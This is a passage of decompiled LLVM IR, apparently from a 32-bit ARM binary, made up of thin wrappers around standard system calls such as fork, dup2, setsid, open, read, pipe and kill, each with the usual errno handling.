bb9:                                              ; preds = %dec_label_pc_104dc, %bb
  %v4_10510 = mul i32 %v2_10508, 65536
  %v5_10510 = add i32 %v4_10510, %v2_104f8
  store i32 %arg3, i32* @lr, align 4
  ret i32 %v5_10510

; uselistorder directives
  uselistorder i32 %v2_104fc, { 1, 0 }
  uselistorder i32 %v6_104f0, { 1, 0 }
  uselistorder i32 %v3_104ec, { 1, 0 }
  uselistorder i32 %v3_104e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_10530() local_unnamed_addr {
dec_label_pc_10530:
  %v0_10530 = call i32 @vfork()
  store i32 %v0_10530, i32* @r0, align 4
  %v2_10534 = icmp ugt i32 %v0_10530, -4097
  br i1 %v2_10534, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_10548, %dec_label_pc_10530
  %merge = phi i32 [ %v0_10530, %dec_label_pc_10530 ], [ %v0_10548, %dec_label_pc_10548 ]
  ret i32 %merge

bb1:                                              ; preds = %dec_label_pc_10530
  %v4_10540 = icmp eq i32 %v0_10530, -38
  br i1 %v4_10540, label %dec_label_pc_10548, label %bb2

dec_label_pc_10548:                               ; preds = %bb1
  %v0_10548 = call i32 @fork()
  store i32 %v0_10548, i32* @r0, align 4
  %v2_1054c = icmp ugt i32 %v0_10548, -4097
  br i1 %v2_1054c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_10548
  %v0_10554 = call i32 @function_13e84()
  ret i32 %v0_10554

; uselistorder directives
  uselistorder i32 %v0_10548, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10560(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10560:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_10560 = load i32, i32* @r2, align 4
  %v1_10570 = add i32 %arg2, -12
  store i32 %v6_10560, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_10570, 2
  br i1 %tmp, label %dec_label_pc_10598, label %dec_label_pc_10590

dec_label_pc_10590:                               ; preds = %dec_label_pc_10560
  %v0_10590 = call i32 @function_105d4()
  br label %dec_label_pc_105c4

dec_label_pc_10598:                               ; preds = %dec_label_pc_10560
  %v2_105a0 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_105a0, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_105a0, -4095
  br i1 %tmp8, label %dec_label_pc_105c4, label %dec_label_pc_105b0

dec_label_pc_105b0:                               ; preds = %dec_label_pc_10598
  %v0_105b0 = call i32 @function_10a18()
  %v0_105b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_105b4 = sub i32 0, %v0_105b4
  %v2_105b8 = inttoptr i32 %v0_105b0 to i32*
  store i32 %v1_105b4, i32* %v2_105b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_105c4

dec_label_pc_105c4:                               ; preds = %dec_label_pc_105b0, %dec_label_pc_10598, %dec_label_pc_10590
  %storemerge = phi i32 [ %v0_10590, %dec_label_pc_10590 ], [ %v2_105a0, %dec_label_pc_10598 ], [ -1, %dec_label_pc_105b0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_105a0, { 1, 0, 2 }
}

define i32 @function_105d4() local_unnamed_addr {
dec_label_pc_105d4:
  %r4.global-to-local = alloca i32, align 4
  %v0_105f4 = load i32, i32* @r0, align 4
  store i32 %v0_105f4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_105f4, -4095
  br i1 %tmp, label %dec_label_pc_10610, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %dec_label_pc_105d4
  %v0_10600 = call i32 @function_10a18()
  %v0_10604 = load i32, i32* %r4.global-to-local, align 4
  %v1_10604 = sub i32 0, %v0_10604
  %v2_10608 = inttoptr i32 %v0_10600 to i32*
  store i32 %v1_10604, i32* %v2_10608, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %dec_label_pc_105d4, %dec_label_pc_10600
  %v0_10610 = phi i32 [ %v0_105f4, %dec_label_pc_105d4 ], [ -1, %dec_label_pc_10600 ]
  ret i32 %v0_10610

; uselistorder directives
  uselistorder i32 %v0_105f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10610, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_10624(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_10624:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_1064c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1064c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1064c = load i32, i32* @r4, align 4
  store i32 %v3_1064c, i32* %stack_var_-8, align 4
  %v3_10650 = call i32 @chdir(i8* %arg1)
  store i32 %v3_10650, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_10650, -4095
  br i1 %tmp, label %dec_label_pc_10670, label %dec_label_pc_10660

dec_label_pc_10660:                               ; preds = %dec_label_pc_1064c
  %v0_10660 = call i32 @function_10a18()
  %v0_10664 = load i32, i32* %r4.global-to-local, align 4
  %v1_10664 = sub i32 0, %v0_10664
  %v2_10668 = inttoptr i32 %v0_10660 to i32*
  store i32 %v1_10664, i32* %v2_10668, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10670

dec_label_pc_10670:                               ; preds = %dec_label_pc_1064c, %dec_label_pc_10660
  %v0_10670 = phi i32 [ %v3_10650, %dec_label_pc_1064c ], [ -1, %dec_label_pc_10660 ]
  %v2_10674 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10674, i32* @r4, align 4
  ret i32 %v0_10670

; uselistorder directives
  uselistorder i32 %v3_10650, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10670, { 1, 0 }
}

define i32 @function_10678(i32 %arg1) local_unnamed_addr {
dec_label_pc_10678:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10678 = load i32, i32* @r4, align 4
  store i32 %v3_10678, i32* %stack_var_-8, align 4
  %v1_1067c = call i32 @close(i32 %arg1)
  store i32 %v1_1067c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1067c, -4095
  br i1 %tmp, label %dec_label_pc_1069c, label %dec_label_pc_1068c

dec_label_pc_1068c:                               ; preds = %dec_label_pc_10678
  %v0_1068c = call i32 @function_10a18()
  %v0_10690 = load i32, i32* %r4.global-to-local, align 4
  %v1_10690 = sub i32 0, %v0_10690
  %v2_10694 = inttoptr i32 %v0_1068c to i32*
  store i32 %v1_10690, i32* %v2_10694, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1069c

dec_label_pc_1069c:                               ; preds = %dec_label_pc_10678, %dec_label_pc_1068c
  %v0_1069c = phi i32 [ %v1_1067c, %dec_label_pc_10678 ], [ -1, %dec_label_pc_1068c ]
  %v2_106a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_106a0, i32* @r4, align 4
  ret i32 %v0_1069c

; uselistorder directives
  uselistorder i32 %v1_1067c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1069c, { 1, 0 }
}

define i32 @function_106a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_106a4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_106a4 = load i32, i32* @r4, align 4
  store i32 %v3_106a4, i32* %stack_var_-8, align 4
  %v2_106a8 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_106a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_106a8, -4095
  br i1 %tmp, label %dec_label_pc_106c8, label %dec_label_pc_106b8

dec_label_pc_106b8:                               ; preds = %dec_label_pc_106a4
  %v0_106b8 = call i32 @function_10a18()
  %v0_106bc = load i32, i32* %r4.global-to-local, align 4
  %v1_106bc = sub i32 0, %v0_106bc
  %v2_106c0 = inttoptr i32 %v0_106b8 to i32*
  store i32 %v1_106bc, i32* %v2_106c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_106c8

dec_label_pc_106c8:                               ; preds = %dec_label_pc_106a4, %dec_label_pc_106b8
  %v0_106c8 = phi i32 [ %v2_106a8, %dec_label_pc_106a4 ], [ -1, %dec_label_pc_106b8 ]
  %v2_106cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_106cc, i32* @r4, align 4
  ret i32 %v0_106c8

; uselistorder directives
  uselistorder i32 %v2_106a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_106c8, { 1, 0 }
}

define i32 @function_106d0() local_unnamed_addr {
dec_label_pc_106d0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_106d0 = load i32, i32* @r4, align 4
  store i32 %v3_106d0, i32* %stack_var_-8, align 4
  %v0_106d4 = call i32 @fork()
  store i32 %v0_106d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_106d4, -4095
  br i1 %tmp, label %dec_label_pc_106f4, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106d0
  %v0_106e4 = call i32 @function_10a18()
  %v0_106e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_106e8 = sub i32 0, %v0_106e8
  %v2_106ec = inttoptr i32 %v0_106e4 to i32*
  store i32 %v1_106e8, i32* %v2_106ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106d0, %dec_label_pc_106e4
  %v0_106f4 = phi i32 [ %v0_106d4, %dec_label_pc_106d0 ], [ -1, %dec_label_pc_106e4 ]
  %v2_106f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_106f8, i32* @r4, align 4
  ret i32 %v0_106f4

; uselistorder directives
  uselistorder i32 %v0_106d4, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_106f4, { 1, 0 }
}

define i32 @function_106fc() local_unnamed_addr {
dec_label_pc_106fc:
  %stack_var_-12 = alloca i32, align 4
  %v2_10700 = ptrtoint i32* %stack_var_-12 to i32
  %v2_1070c = call i32 @function_10750(i32 7, i32 %v2_10700)
  %v1_10710 = icmp slt i32 %v2_1070c, 0
  br i1 %v1_10710, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_106fc
  %v5_10718 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_106fc, %bb
  %v5_10720 = phi i32 [ 256, %dec_label_pc_106fc ], [ %v5_10718, %bb ]
  ret i32 %v5_10720

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_10724() local_unnamed_addr {
dec_label_pc_10724:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10724 = load i32, i32* @r4, align 4
  store i32 %v3_10724, i32* %stack_var_-8, align 4
  %v0_10728 = call i32 @getpid()
  store i32 %v0_10728, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10728, -4095
  br i1 %tmp, label %dec_label_pc_10748, label %dec_label_pc_10738

dec_label_pc_10738:                               ; preds = %dec_label_pc_10724
  %v0_10738 = call i32 @function_10a18()
  %v0_1073c = load i32, i32* %r4.global-to-local, align 4
  %v1_1073c = sub i32 0, %v0_1073c
  %v2_10740 = inttoptr i32 %v0_10738 to i32*
  store i32 %v1_1073c, i32* %v2_10740, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %dec_label_pc_10724, %dec_label_pc_10738
  %v0_10748 = phi i32 [ %v0_10728, %dec_label_pc_10724 ], [ -1, %dec_label_pc_10738 ]
  %v2_1074c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1074c, i32* @r4, align 4
  ret i32 %v0_10748

; uselistorder directives
  uselistorder i32 %v0_10728, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10748, { 1, 0 }
}

define i32 @function_10750(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10750:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10750 = load i32, i32* @r4, align 4
  store i32 %v3_10750, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10774, label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %dec_label_pc_10750
  %v0_10764 = call i32 @function_10a18()
  %v0_10768 = load i32, i32* %r4.global-to-local, align 4
  %v1_10768 = sub i32 0, %v0_10768
  %v2_1076c = inttoptr i32 %v0_10764 to i32*
  store i32 %v1_10768, i32* %v2_1076c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10778.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %dec_label_pc_10750, %dec_label_pc_10764
  %v2_10778 = phi i32 [ %v3_10750, %dec_label_pc_10750 ], [ %v2_10778.pre, %dec_label_pc_10764 ]
  %v0_10774 = phi i32 [ %arg1, %dec_label_pc_10750 ], [ -1, %dec_label_pc_10764 ]
  store i32 %v2_10778, i32* @r4, align 4
  ret i32 %v0_10774

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10774, { 1, 0 }
}

define i32 @function_1077c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1077c:
  %r4.global-to-local = alloca i32, align 4
  %v2_10798 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_10798, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10798, -4095
  br i1 %tmp, label %dec_label_pc_107b8, label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %dec_label_pc_1077c
  %v0_107a8 = call i32 @function_10a18()
  %v0_107ac = load i32, i32* %r4.global-to-local, align 4
  %v1_107ac = sub i32 0, %v0_107ac
  %v2_107b0 = inttoptr i32 %v0_107a8 to i32*
  store i32 %v1_107ac, i32* %v2_107b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %dec_label_pc_1077c, %dec_label_pc_107a8
  %v0_107b8 = phi i32 [ %v2_10798, %dec_label_pc_1077c ], [ -1, %dec_label_pc_107a8 ]
  ret i32 %v0_107b8

; uselistorder directives
  uselistorder i32 %v2_10798, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107b8, { 1, 0 }
}

define i32 @function_107cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_107cc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107cc = load i32, i32* @r4, align 4
  store i32 %v3_107cc, i32* %stack_var_-8, align 4
  %v2_107d0 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_107d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_107d0, -4095
  br i1 %tmp, label %dec_label_pc_107f0, label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %dec_label_pc_107cc
  %v0_107e0 = call i32 @function_10a18()
  %v0_107e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_107e4 = sub i32 0, %v0_107e4
  %v2_107e8 = inttoptr i32 %v0_107e0 to i32*
  store i32 %v1_107e4, i32* %v2_107e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_107f0

dec_label_pc_107f0:                               ; preds = %dec_label_pc_107cc, %dec_label_pc_107e0
  %v0_107f0 = phi i32 [ %v2_107d0, %dec_label_pc_107cc ], [ -1, %dec_label_pc_107e0 ]
  %v2_107f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_107f4, i32* @r4, align 4
  ret i32 %v0_107f0

; uselistorder directives
  uselistorder i32 %v2_107d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107f0, { 1, 0 }
}

define i32 @function_107f8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_107f8:
  %r4.global-to-local = alloca i32, align 4
  %v1_10808 = and i32 %arg2, 64
  %v2_10808 = icmp eq i32 %v1_10808, 0
  br i1 %v2_10808, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_107f8
  %v6_107f8 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_107f8, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_107f8, %bb
  %v0_10818 = phi i32 [ 0, %dec_label_pc_107f8 ], [ %phitmp, %bb ]
  store i32 %v0_10818, i32* @r2, align 4
  %v4_10820 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_10824 = icmp eq i32 %v4_10820, -4096
  store i1 %v7_10824, i1* @cpsr_z, align 1
  store i32 %v4_10820, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_10820, -4095
  br i1 %tmp, label %dec_label_pc_10840, label %dec_label_pc_10830

dec_label_pc_10830:                               ; preds = %.thread1
  %v0_10830 = call i32 @function_10a18()
  %v0_10834 = load i32, i32* %r4.global-to-local, align 4
  %v1_10834 = sub i32 0, %v0_10834
  %v2_10838 = inttoptr i32 %v0_10830 to i32*
  store i32 %v1_10834, i32* %v2_10838, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10840

dec_label_pc_10840:                               ; preds = %.thread1, %dec_label_pc_10830
  %v0_10840 = phi i32 [ %v4_10820, %.thread1 ], [ -1, %dec_label_pc_10830 ]
  ret i32 %v0_10840

; uselistorder directives
  uselistorder i32 %v4_10820, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10840, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10854(i32 %arg1) local_unnamed_addr {
dec_label_pc_10854:
  store i32 %arg1, i32* @r2, align 4
  %v0_1085c = load i32, i32* @r0, align 4
  %v2_1085c = inttoptr i32 %v0_1085c to i8*
  %v3_1085c = call i32 @function_107f8(i8* %v2_1085c, i32 577)
  %v0_10860 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10860, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_10854
  %v6_10860 = and i32 %v3_1085c, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_10854, %bb
  %v7_10860 = phi i32 [ %v3_1085c, %dec_label_pc_10854 ], [ %v6_10860, %bb ]
  ret i32 %v7_10860

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10864(i32 %arg1) local_unnamed_addr {
dec_label_pc_10864:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10864 = load i32, i32* @r4, align 4
  store i32 %v3_10864, i32* %stack_var_-8, align 4
  %v1_10868 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_10868 = call i32 @pipe([2 x i32] %v1_10868)
  store i32 %v2_10868, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10868, -4095
  br i1 %tmp, label %dec_label_pc_10888, label %dec_label_pc_10878

dec_label_pc_10878:                               ; preds = %dec_label_pc_10864
  %v0_10878 = call i32 @function_10a18()
  %v0_1087c = load i32, i32* %r4.global-to-local, align 4
  %v1_1087c = sub i32 0, %v0_1087c
  %v2_10880 = inttoptr i32 %v0_10878 to i32*
  store i32 %v1_1087c, i32* %v2_10880, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10888

dec_label_pc_10888:                               ; preds = %dec_label_pc_10864, %dec_label_pc_10878
  %v0_10888 = phi i32 [ %v2_10868, %dec_label_pc_10864 ], [ -1, %dec_label_pc_10878 ]
  %v2_1088c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1088c, i32* @r4, align 4
  ret i32 %v0_10888

; uselistorder directives
  uselistorder i32 %v2_10868, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10888, { 1, 0 }
}

define i32 @function_10890(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10890:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10890 = load i32, i32* @r4, align 4
  store i32 %v3_10890, i32* %stack_var_-8, align 4
  %v4_10894 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_10894, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_10894, -4095
  br i1 %tmp, label %dec_label_pc_108b4, label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10890
  %v0_108a4 = call i32 @function_10a18()
  %v0_108a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_108a8 = sub i32 0, %v0_108a8
  %v2_108ac = inttoptr i32 %v0_108a4 to i32*
  store i32 %v1_108a8, i32* %v2_108ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %dec_label_pc_10890, %dec_label_pc_108a4
  %v0_108b4 = phi i32 [ %v4_10894, %dec_label_pc_10890 ], [ -1, %dec_label_pc_108a4 ]
  %v2_108b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_108b8, i32* @r4, align 4
  ret i32 %v0_108b4

; uselistorder directives
  uselistorder i32 %v4_10894, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108b4, { 1, 0 }
}

define i32 @function_108bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_108bc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108bc = load i32, i32* @r4, align 4
  store i32 %v3_108bc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_108e4, label %dec_label_pc_108d4

dec_label_pc_108d4:                               ; preds = %dec_label_pc_108bc
  %v0_108d4 = call i32 @function_10a18()
  %v0_108d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_108d8 = sub i32 0, %v0_108d8
  %v2_108dc = inttoptr i32 %v0_108d4 to i32*
  store i32 %v1_108d8, i32* %v2_108dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_108e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108bc, %dec_label_pc_108d4
  %v2_108e8 = phi i32 [ %v3_108bc, %dec_label_pc_108bc ], [ %v2_108e8.pre, %dec_label_pc_108d4 ]
  %v0_108e4 = phi i32 [ %arg1, %dec_label_pc_108bc ], [ -1, %dec_label_pc_108d4 ]
  store i32 %v2_108e8, i32* @r4, align 4
  ret i32 %v0_108e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108e4, { 1, 0 }
}

define i32 @function_108ec() local_unnamed_addr {
dec_label_pc_108ec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_108ec = load i32, i32* @r4, align 4
  store i32 %v3_108ec, i32* %stack_var_-8, align 4
  %v0_108f0 = call i32 @setsid()
  store i32 %v0_108f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_108f0, -4095
  br i1 %tmp, label %dec_label_pc_10910, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108ec
  %v0_10900 = call i32 @function_10a18()
  %v0_10904 = load i32, i32* %r4.global-to-local, align 4
  %v1_10904 = sub i32 0, %v0_10904
  %v2_10908 = inttoptr i32 %v0_10900 to i32*
  store i32 %v1_10904, i32* %v2_10908, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10910

dec_label_pc_10910:                               ; preds = %dec_label_pc_108ec, %dec_label_pc_10900
  %v0_10910 = phi i32 [ %v0_108f0, %dec_label_pc_108ec ], [ -1, %dec_label_pc_10900 ]
  %v2_10914 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10914, i32* @r4, align 4
  ret i32 %v0_10910

; uselistorder directives
  uselistorder i32 %v0_108f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10910, { 1, 0 }
}

define i32 @function_10918(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10918:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10918 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_10918, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10918
  %v3_109205 = load i32, i32* @r4, align 4
  store i32 %v3_109205, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10940

bb:                                               ; preds = %dec_label_pc_10918
  %v3_10920 = load i32, i32* @r4, align 4
  store i32 %v3_10920, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_10940, label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %bb
  %v0_1092c = call i32 @function_10a18()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10938 = inttoptr i32 %v0_1092c to i32*
  store i32 22, i32* %v2_10938, align 4
  %v0_10964.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10964

dec_label_pc_10940:                               ; preds = %.thread, %bb
  %v7_10940 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_10940, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_10940, -4095
  br i1 %tmp13, label %dec_label_pc_10960, label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_10940
  %v0_10950 = call i32 @function_10a18()
  %v0_10954 = load i32, i32* %r4.global-to-local, align 4
  %v1_10954 = sub i32 0, %v0_10954
  %v2_10958 = inttoptr i32 %v0_10950 to i32*
  store i32 %v1_10954, i32* %v2_10958, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_10940, %dec_label_pc_10950
  %v0_10960 = phi i32 [ %v7_10940, %dec_label_pc_10940 ], [ -1, %dec_label_pc_10950 ]
  store i32 %v0_10960, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10964

dec_label_pc_10964:                               ; preds = %dec_label_pc_1092c, %dec_label_pc_10960
  %v0_10964 = phi i32 [ %v0_10964.pre, %dec_label_pc_1092c ], [ %v0_10960, %dec_label_pc_10960 ]
  %v2_10968 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10968, i32* @r4, align 4
  ret i32 %v0_10964

; uselistorder directives
  uselistorder i32 %v7_10940, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10964, { 1, 0 }
  uselistorder label %dec_label_pc_10960, { 1, 0 }
  uselistorder label %dec_label_pc_10940, { 1, 0 }
}

define i32 @function_1096c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1096c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1096c = load i32, i32* @r4, align 4
  store i32 %v3_1096c, i32* %stack_var_-8, align 4
  %v2_10970 = call i32 @time(i32* %arg1)
  store i32 %v2_10970, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10970, -4095
  br i1 %tmp, label %dec_label_pc_10990, label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %dec_label_pc_1096c
  %v0_10980 = call i32 @function_10a18()
  %v0_10984 = load i32, i32* %r4.global-to-local, align 4
  %v1_10984 = sub i32 0, %v0_10984
  %v2_10988 = inttoptr i32 %v0_10980 to i32*
  store i32 %v1_10984, i32* %v2_10988, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10990

dec_label_pc_10990:                               ; preds = %dec_label_pc_1096c, %dec_label_pc_10980
  %v0_10990 = phi i32 [ %v2_10970, %dec_label_pc_1096c ], [ -1, %dec_label_pc_10980 ]
  %v2_10994 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10994, i32* @r4, align 4
  ret i32 %v0_10990

; uselistorder directives
  uselistorder i32 %v2_10970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10990, { 1, 0 }
}

define i32 @function_10998(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10998:
  store i32 0, i32* @r3, align 4
  %v0_1099c = call i32 @function_14078()
  ret i32 %v0_1099c
}

define i32 @function_109a0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_109a0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
